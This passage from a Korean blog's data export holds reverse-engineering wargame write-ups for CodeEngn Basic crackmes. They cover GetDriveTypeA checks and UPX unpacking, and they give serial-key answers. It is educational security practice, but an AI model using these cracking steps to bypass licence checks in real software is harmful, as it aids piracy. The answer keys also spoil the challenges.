srcset=\"/static/76b1ed89ad4ec691f84f41fe79870e2b/04c57/0.png 165w,\n/static/76b1ed89ad4ec691f84f41fe79870e2b/d9ecf/0.png 330w,\n/static/76b1ed89ad4ec691f84f41fe79870e2b/ae6b7/0.png 655w\"\n            sizes=\"(max-width: 655px) 100vw, 655px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/76b1ed89ad4ec691f84f41fe79870e2b/ae6b7/0.png\"\n            alt=\"cp\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>JE 파트를 보면, EAX와 ESI가 같을 시, HDD를 CD-Rom으로 인식하겠다는 창이 뜬다. 이 EAX와 ESI값은 위에서 GetDriveTypeA함수를 지나면서 결정된다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 114px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 101.75438596491229%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAIAAAAC64paAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAD3klEQVR42l2R7U9TZxjGr/Oc1ra89IUZBQqUVlpa+kZfT0tpOdCW9rTnnL7XQEGEJSLRIEjAD0an4Id92qaZ4JgwXULIgGFCgIFLFjbDJ/dHLXQJBu5cuXLfH+7nd915sLW5sbH525/HHw//ONze3j4+Pt7d2dnb3z86Otrf3z84ODj5+5+Tk79+39leX3u7trq6sbWzu7uzt7d/enqK9z+vfLO4tPT02cP5+TfLq69fL3//3cuV5eXnL77d3Np89fKHD4cfP306+eXdr+/fra2tvPnxp9X19bc72x8+f/4XxVKpWChwyWQo1JPguEwqVRKEHJ8upPlSJlPk+fyZ0kI8Xs5ms7mcKAiJwUQimRRFEUxvREjHOTGfz6QpgiTwAJgF7gAzwL2q5oExIAZQuFgtbTpzp8nhsFvMJqlMqickQNMumvZU5abprupoo2knTctpmtBfCkyYzaTiTpdXFFISAjvQB0SBEFAE+oE8kABYYBjQVHlf+C26dluXpdNstlm7JFK6FWgFDIAWsAEuoBMwA45qL7sU2xMMpYR0LiNyyRgo9FPkHiF3CRmnqDsUGSfkNiGThNyquvoSWd9hcnndoZ6g3++jJcRWzRwHBqoeBSJV//8WxSWyzeniBrk0z/f2+AH4Yqmhr8cSAsewfcFoNJ4rFkeGircqYmWkXCnW18nPyOdoo6UrxPRwHMdGQgTw9fSVCvn+XiYY6ksMsEImlxX5cj7Di7mCMFhXI7uw3Gm1B/wep9vLhiMSwOZmUlyCZSNWS5fL4+1nwwHG6/H5goFAkAlcuRTb6fF6XA4+m2OcDgBsQpiYGMuK6XBvWODFUNBtNGjt3sDw8DCfTNRI6AvL+g5TgAmGI2G/x00Ao9kW7gn6vV7jDYPVamO8Lle3o7u722rpslvMEgCEUOe5XT6Gi3GTU1PxUAhAojTy4NHc8NhwJBrLD1U4Pubx2q2B0M3bE6MjFQVNzv/q7IlWnd5ht+r07W1aLQAdLXFLJFaJ1CaTOaUSPUW1g3JRxCo56ylAbzQbdFrZFVl9bS0C4chglOV4fjDSB4CnqAXgPjBadRFUBdTj6sgRIgN6B5L3p6fLxUKMDaOxWWvsNHWaTEaDAUDT9SaLXt+mbW5sbOrQ6W40NumuXTPqDcY2nbldRwPXm1vaWprkcplCLkfvQKw8dLNSKadjSQCFscnni08ezc1M3Z1dWJjOlcpj46NLL57NPX66+GRGIaWjiczsw9lSPh9nI5ArFGqNpkGjUatUAGrr6tRqdW1NjVymUKlUGrWmoUGjVCpVKpVSpaSAKzL5V1evqtVqpbL+Px+L7ZTvzU6pAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f63dc6ffd6da484050dfa1f689b1fea5/7c4ab/1.webp 114w\"\n              sizes=\"(max-width: 114px) 100vw, 114px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f63dc6ffd6da484050dfa1f689b1fea5/ae901/1.png 114w\"\n            sizes=\"(max-width: 114px) 100vw, 114px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f63dc6ffd6da484050dfa1f689b1fea5/ae901/1.png\"\n            alt=\"reg\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>GetDriveTypeA를 지나고 나면 EAX값이 3으로 되어있는데, CMP를 할 때 ESI값이 401003이다. GetDriveTypeA를 지난 이후 EAX는 2만큼 감소, ESI는 3만큼 증가한다. 즉 GetDriveTypeA 함수를 지난 직후 ESI는 401000이며, EAX는 그것보다 5만큼 큰 401005가 되어야 할 것이다. 그리고 함수의 리턴값은 EAX에 저장되므로, HDD를 CD-Rom으로 인식시키기 위한 GetDriveTypeA의 리턴값은 401005가 되어야 한다.\r\n그러나 답이 맞지 않는 경우가 발생하는데, 그렇지 않아도 Entry point alert가 뜬다.. PSAPI의 entry point가 코드 외부에 있다는 것. 진짜 API를 사용하는 것으로 보이는데, 컴퓨터의 버전을 타는 것으로 추정된다. 답이 다를 수밖에 없는 문제라고 판단을 내림.</p>\n<p>정답은 5</p>\n<p>| Return code/value\tDescription |\r\n| -- | -- |\r\n| DRIVE_UNKNOWN 0\t| The drive type cannot be determined. |\r\n| DRIVE_NO_ROOT_DIR 1\t| The root path is invalid; for example, there is no volume mounted at the specified path. |\r\n| DRIVE_REMOVABLE 2\t| The drive has removable media; for example, a floppy drive, thumb drive, or flash card | reader. |\r\n| DRIVE_FIXED 3\t| The drive has fixed media; for example, a hard disk drive or flash drive. |\r\n| DRIVE_REMOTE 4\t| The drive is a remote (network) drive. |\r\n| DRIVE_CDROM 5\t| The drive is a CD-ROM drive. |\r\n| DRIVE_RAMDISK 6\t| The drive is a RAM disk. |</p>\n<p>출처: <a href=\"https://msdn.microsoft.com/ko-kr/library/windows/desktop/aa364939(v=vs.85).aspx\">https://msdn.microsoft.com/ko-kr/library/windows/desktop/aa364939(v=vs.85).aspx</a></p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"9dd30288-ff97-56ed-8b97-9a36321d9805","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-01/","title":"CodeEngn Basic 01","readingTime":{"text":"3 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#e8e8e8","images":{"fallback":{"src":"/static/86c4c31e7ae6e89f3c3ff9b398d1416c/ae22b/0.png","srcSet":"/static/86c4c31e7ae6e89f3c3ff9b398d1416c/db7a7/0.png 71w,\n/static/86c4c31e7ae6e89f3c3ff9b398d1416c/2b65a/0.png 142w,\n/static/86c4c31e7ae6e89f3c3ff9b398d1416c/ae22b/0.png 283w","sizes":"(min-width: 283px) 283px, 100vw"},"sources":[{"srcSet":"/static/86c4c31e7ae6e89f3c3ff9b398d1416c/ed67f/0.webp 71w,\n/static/86c4c31e7ae6e89f3c3ff9b398d1416c/43197/0.webp 142w,\n/static/86c4c31e7ae6e89f3c3ff9b398d1416c/bb5c3/0.webp 283w","type":"image/webp","sizes":"(min-width: 283px) 283px, 100vw"}]},"width":660,"height":401.13074204947}}}},"body":"<p>Unpack을 한 후 Serial을 찾으시오. 정답인증은 OEP + Serial\r\nEx) 00400000PASSWORD</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 283px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.75757575757576%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABE0lEQVR42nXKP0vDQBgG8PtoxdFFnEpUlCqIDq0UI0pXUQSp/6gUa2wNBT9HtkAGh1Ss2nC5SyDE65kMtblIeokYibSlPvyGl+d5gbBfXqvs5sViXiytVsSVg7KwV5rfLuTWl+Y2lmfKFYTFna2F4iao3ku1B7naur1oNy/brXP57rTZOJHqx43r/xzd1M5k6bB+BaAJPweDkLFgGKSGLGBhwEKWyo4vFv4JA8ajCFoYvBnGKIriJInT8MxPk+FjPY/jEedJkvRMCLBtE0LeJ+O6LkLISoMty3GcqZX2+08vXQARopR+jMXzPEKIqqqapum6rigKxtj3/Yk3SjvdZ/Bq9BBGJjKn/JYzJ2hC27YeO/o3DERMflM60dwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/86c4c31e7ae6e89f3c3ff9b398d1416c/c9b55/0.webp 165w,\n/static/86c4c31e7ae6e89f3c3ff9b398d1416c/30314/0.webp 283w\"\n              sizes=\"(max-width: 283px) 100vw, 283px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/86c4c31e7ae6e89f3c3ff9b398d1416c/04c57/0.png 165w,\n/static/86c4c31e7ae6e89f3c3ff9b398d1416c/bde6a/0.png 283w\"\n            sizes=\"(max-width: 283px) 100vw, 283px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/86c4c31e7ae6e89f3c3ff9b398d1416c/bde6a/0.png\"\n            alt=\"crackme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>시리얼 키를 입력하는 창과 확인버튼이 있는 프로그램이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 512px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.75757575757576%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAqUlEQVR42i3HMQuCQBgG4Pco/VLvOkszFBWROHXIKDNpSaGgqTXpR2SL/58aerYHw3sYx09V9XH0SNOnUi8pb7ttd9w3i+Ruqs4sWhF23Oy4aKW8CtESXYhaojM2G5VlyrJWUewHwdL3bdPQbVXmhzIvVkFCc0cX9kxw4lx3XC7lDNAAAoD6WDen2vOSMIyltAEwNl33yq1dEU9EAi1iWDAwBjD8EWD8+gUg5RL5G9TGOgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/2552fdd9883a951cbde52b048828a747/c9b55/1.webp 165w,\n/static/2552fdd9883a951cbde52b048828a747/f2908/1.webp 330w,\n/static/2552fdd9883a951cbde52b048828a747/bd5dd/1.webp 512w\"\n              sizes=\"(max-width: 512px) 100vw, 512px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/2552fdd9883a951cbde52b048828a747/04c57/1.png 165w,\n/static/2552fdd9883a951cbde52b048828a747/d9ecf/1.png 330w,\n/static/2552fdd9883a951cbde52b048828a747/01e7c/1.png 512w\"\n            sizes=\"(max-width: 512px) 100vw, 512px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/2552fdd9883a951cbde52b048828a747/01e7c/1.png\"\n            alt=\"pushad\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>올리디버거로 열어보니, 5번문제와 같이 PUSHAD로 시작하는 것을 볼 수 있다. PEiD 툴로 이 프로그램에 대해 조사한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 416px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.96969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACB0lEQVR42kXMWW/TQBAHcH9NjkYIJJ4QihqgkAJClaDiia+E2jSHE7vxkcbe3ex6L+/6tjcuzyihwG/mZf6aGevl1x+vLy9effsy/H7x7OPbk/FoMD4dnI8G528eejw6GY+enA0H49Hjs+HTD6eP3g1ffH7//NOZ5ay9cLudzKbT+Xwym/68vrKd1cy2r24mM3sxtRfXN5Ol48QIIUIQwYjghLOl605mM6soyq7tijxLZZpnmUpTKVPBheCcMy64OOb5fd//ur/v+950pu/7NE0ZpRZjDO0QF5IzFgQBxqRtW2OM2T8QQiKEGGMYkyShTdtWdZ1lWaqUBQBa364BgHi3c1YOALBt2+a/lhAW+H4MIMEkjiKa0CzPlVJJkliUMgQRSRKMcbSNGONVVR2O/uJcxABgTAjGvueH4UZrrZSilFqEJBBCSinnvK6bvu+7rjOmM92B6bqEJNu77WGHsWgb7XbYmL3WWnBh1XV1qKpsmrYqq/KoKIr8qCzLqqrMUdd1+/3eGNM2TV3XTdNYEMIgCMIgJJhE2whChCAAAIEYrNdeHEWe5yml//0syrI4DnVdW4SQ5XIV+AGlDALguq6zcghJMq0W87nvh1LKPMvWt7dhuOGc53m+CcM4BmmaWuFms7Bt13U9P1BaCymFlEprpZWQBzrTf3KZSp1lQgrXdTd3mxiC32hUKw+FbroHAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f93dd2127c12e9edf8cd56775d9b73a1/c9b55/2.webp 165w,\n/static/f93dd2127c12e9edf8cd56775d9b73a1/f2908/2.webp 330w,\n/static/f93dd2127c12e9edf8cd56775d9b73a1/da4cb/2.webp 416w\"\n              sizes=\"(max-width: 416px) 100vw, 416px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f93dd2127c12e9edf8cd56775d9b73a1/04c57/2.png 165w,\n/static/f93dd2127c12e9edf8cd56775d9b73a1/d9ecf/2.png 330w,\n/static/f93dd2127c12e9edf8cd56775d9b73a1/b0122/2.png 416w\"\n            sizes=\"(max-width: 416px) 100vw, 416px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f93dd2127c12e9edf8cd56775d9b73a1/b0122/2.png\"\n            alt=\"PEiD\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>UPX1으로 패킹되어 있다고 뜬다. 언패킹을 해주도록 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.848484848484848%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAwElEQVR42mWPy2rEMBAEW6ORrcixNJasl83asBDy/38Yot1TUoeGhupDI8YkXkoupdYcc665PEv/OtZu9gdCh8vL8X20s5ZUnHPTNCml8EJ/asyAHuUDmIAAJGADPLCP6gGLt2aBZZgaYGuIKaYUU7KLBRC2IJsAkCgSg1Jq3/fZzcSkSIHGjAAFMHOr7TzOebY5ZQkisl2Pyxhz3/d93cymt15LNWzwh+M8e+ve+3Vd9UARMTONZObfa0Raa/zjB3HTCs9z0r5CAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c07e733cde4c0e32d77383a5f3022f10/c9b55/3.webp 165w,\n/static/c07e733cde4c0e32d77383a5f3022f10/f2908/3.webp 330w,\n/static/c07e733cde4c0e32d77383a5f3022f10/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c07e733cde4c0e32d77383a5f3022f10/04c57/3.png 165w,\n/static/c07e733cde4c0e32d77383a5f3022f10/d9ecf/3.png 330w,\n/static/c07e733cde4c0e32d77383a5f3022f10/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c07e733cde4c0e32d77383a5f3022f10/32056/3.png\"\n            alt=\"upx\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 11.515151515151516%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAeUlEQVR42mNIT08ND0tSVXVVVHLm5dQX1PRXtwuUUbDk5Nfj4tLl5tbj4dHn4dHj4THj4THk5TWAIB4eAx4efQZNTU1lZS0hYRElJVldLTURdV0eQ3EeUxYOdVYOThZWVmYGMGBk5ODgZOfiYuVgZ+bmZuPgYAGKAgD9+wyDqxgQfQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b92f0945b621a58758c4b027727a329f/c9b55/4.webp 165w,\n/static/b92f0945b621a58758c4b027727a329f/f2908/4.webp 330w,\n/static/b92f0945b621a58758c4b027727a329f/ff4b8/4.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b92f0945b621a58758c4b027727a329f/04c57/4.png 165w,\n/static/b92f0945b621a58758c4b027727a329f/d9ecf/4.png 330w,\n/static/b92f0945b621a58758c4b027727a329f/32056/4.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b92f0945b621a58758c4b027727a329f/32056/4.png\"\n            alt=\"unpacking\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>언패킹에 성공하고, 제대로 된 entry point로 시작함을 볼 수 있다.\r\nOEP는 401360이다.\r\n이제 시리얼 키를 찾기 위해 문자열을 모아 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 515px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 19.393939393939394%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAz0lEQVR42mXN3U6DMACG4a+tiXGbMqFgXMzqjHMrbO3aUkATGQwG/tz//ZiYeOR7/uTFOPRKVcbm+qDquj61pySOARBC8BehE2dLIYQxtvB5KiVjDIRgPPf7XWWN11of62YYxiTiACihBBRgv3jmTCWWwhiXySy4DoKbOWMXaLv3dOdy7w9WNV3z+T1G4fzf+Sr3pXhcKp0pncl0s35ZhZzD37XPtx9bfpZRU9z37uFrcVlGUAvsEyiKCihBjls+rqav67DbRF0a90+zt4AVPx0THYhVbKHEAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b7b109e6cffd064c3b8264ac2578b371/c9b55/5.webp 165w,\n/static/b7b109e6cffd064c3b8264ac2578b371/f2908/5.webp 330w,\n/static/b7b109e6cffd064c3b8264ac2578b371/92849/5.webp 515w\"\n              sizes=\"(max-width: 515px) 100vw, 515px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b7b109e6cffd064c3b8264ac2578b371/04c57/5.png 165w,\n/static/b7b109e6cffd064c3b8264ac2578b371/d9ecf/5.png 330w,\n/static/b7b109e6cffd064c3b8264ac2578b371/fbdcb/5.png 515w\"\n            sizes=\"(max-width: 515px) 100vw, 515px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b7b109e6cffd064c3b8264ac2578b371/fbdcb/5.png\"\n            alt=\"strings\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>시리얼 키를 볼 수 있다.</p>\n<p>정답: 00401360AD46FS547</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"81ccd440-8fe5-52c8-8dd8-56203cb1b1b1","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-06/","title":"CodeEngn Basic 06","readingTime":{"text":"1 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#486858","images":{"fallback":{"src":"/static/ca349c36d390ffcc3ab0f6eaf64ca41a/1e629/0.png","srcSet":"/static/ca349c36d390ffcc3ab0f6eaf64ca41a/9d609/0.png 77w,\n/static/ca349c36d390ffcc3ab0f6eaf64ca41a/e1ef1/0.png 154w,\n/static/ca349c36d390ffcc3ab0f6eaf64ca41a/1e629/0.png 308w","sizes":"(min-width: 308px) 308px, 100vw"},"sources":[{"srcSet":"/static/ca349c36d390ffcc3ab0f6eaf64ca41a/f212a/0.webp 77w,\n/static/ca349c36d390ffcc3ab0f6eaf64ca41a/75bc6/0.webp 154w,\n/static/ca349c36d390ffcc3ab0f6eaf64ca41a/57858/0.webp 308w","type":"image/webp","sizes":"(min-width: 308px) 308px, 100vw"}]},"width":660,"height":400.7142857142857}}}},"body":"<p>컴퓨터 C 드라이브의 이름이 CodeEngn 일경우 시리얼이 생성될때 CodeEngn은 \"어떤것\"으로 변경되는가</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 308px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.21212121212121%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAwUlEQVR42mMIK8kLLc4OKswKKsgIKcqOLCsIzE+3iQuzjQ/HjhLCLWNDPDMTvTKTGKavWDJ79fLZq5fPWrVszpoVs1cvn7ps0YSFc7GiSUvmT1o8f+qyRdOWL568dAHD9evXr166fPf27Xt37l6/evX2zZu/f/76g4F+//j57/ef50+fnT19eu/u3ZcuXLx8+QrD3fv3Xr958+Lly9dvXr96/er1m9efv3zGir5++3rn7p3TZ86cOHny7Nmz5y6eBwB/1aX9NBxOBAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ca349c36d390ffcc3ab0f6eaf64ca41a/c9b55/0.webp 165w,\n/static/ca349c36d390ffcc3ab0f6eaf64ca41a/6882a/0.webp 308w\"\n              sizes=\"(max-width: 308px) 100vw, 308px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ca349c36d390ffcc3ab0f6eaf64ca41a/04c57/0.png 165w,\n/static/ca349c36d390ffcc3ab0f6eaf64ca41a/2ece4/0.png 308w\"\n            sizes=\"(max-width: 308px) 100vw, 308px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ca349c36d390ffcc3ab0f6eaf64ca41a/2ece4/0.png\"\n            alt=\"crackme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>시리얼 키를 인증하는 프로그램으로 보인다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 188px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.96969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAwklEQVR42gG3AEj/AGdcWF9OSWFSTFtMQ0pDTi4vNwAAACIjIzQzLCUkH0xMRkVFO0FDOSEVFQA4Ugy5uwmIhQ0cCwk1AwkmAADSrcbTn7zOoL/Rp7+6otE3OWIAACMlJko+Pl8jI0U1NVsXFj0AACQAAC8yMTplXDISGjgsQk4pNUMhKSMASE2HQkSAQ0J+ODt7KSh6Jyd5DAxgKClzJCNuNDR6GBZkAABYAwNaAABkRkxIaXgjACdcDEc/BSVOACBOfdkubyL5otgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/1296102fde8e0fcb820583cb764d7161/c9b55/1.webp 165w,\n/static/1296102fde8e0fcb820583cb764d7161/7b30e/1.webp 188w\"\n              sizes=\"(max-width: 188px) 100vw, 188px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/1296102fde8e0fcb820583cb764d7161/04c57/1.png 165w,\n/static/1296102fde8e0fcb820583cb764d7161/4dcb9/1.png 188w\"\n            sizes=\"(max-width: 188px) 100vw, 188px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/1296102fde8e0fcb820583cb764d7161/4dcb9/1.png\"\n            alt=\"JE\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>어떤 함수를 리턴한 EAX값과 비교하여 시리얼 넘버를 판별하는 듯한 조건문이 보인다. 프로그램을 실행시켜 경과를 보도록 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.96969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAr0lEQVR42k3CWwvBUAAH8P8uZ5OcmVNexji5bw+sbZJoyWUmD8olRB58GZGvg+3befDi1w9tx+W85rlOfzTBJEAAWEAaSEEUScOs1AtGjrHZZrW+XpbnQ3jYzo+7xWk/iEL0vW61XOv63nAaSqsIY6AD6EAGokCaBi/rWUVVb4/7O4nfSfyKP7+P5xMX1+/xetO2zVKpEFikJaEIKIAMUZCZlmc0o1GNUkoIASD8+QKjRCDf07bRkAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/275a75a58f03caeb38a8cc05482fc138/c9b55/2.webp 165w,\n/static/275a75a58f03caeb38a8cc05482fc138/f2908/2.webp 330w,\n/static/275a75a58f03caeb38a8cc05482fc138/ff4b8/2.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/275a75a58f03caeb38a8cc05482fc138/04c57/2.png 165w,\n/static/275a75a58f03caeb38a8cc05482fc138/d9ecf/2.png 330w,\n/static/275a75a58f03caeb38a8cc05482fc138/32056/2.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/275a75a58f03caeb38a8cc05482fc138/32056/2.png\"\n            alt=\"input\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>눈에 보이는 문자열을 넣었다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.21212121212121%; position: relative; bottom: 0; left: 0; background-image: 